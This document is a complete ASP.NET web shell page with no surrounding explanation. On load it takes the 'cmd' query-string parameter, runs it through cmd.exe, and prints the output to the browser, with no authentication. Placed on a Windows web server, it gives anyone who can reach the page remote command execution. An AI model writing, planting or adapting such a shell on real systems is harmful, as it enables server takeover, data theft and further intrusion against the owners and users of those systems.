<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];

    Response.Write("<pre>");
    if (cmd != null)
    {
        Response.Write(Execute(cmd));
    }
    Response.Write("</pre>");
}
string Execute(string arg)
{
    ProcessStartInfo info = new ProcessStartInfo();
    info.FileName = "cmd.exe";
    info.Arguments = "/c "+arg;
    info.RedirectStandardOutput = true;
    info.UseShellExecute = false;
    Process p = Process.Start(info);
    StreamReader reader = p.StandardOutput;
    string result = reader.ReadToEnd();
    reader.Close();
    return result;
}
</script>
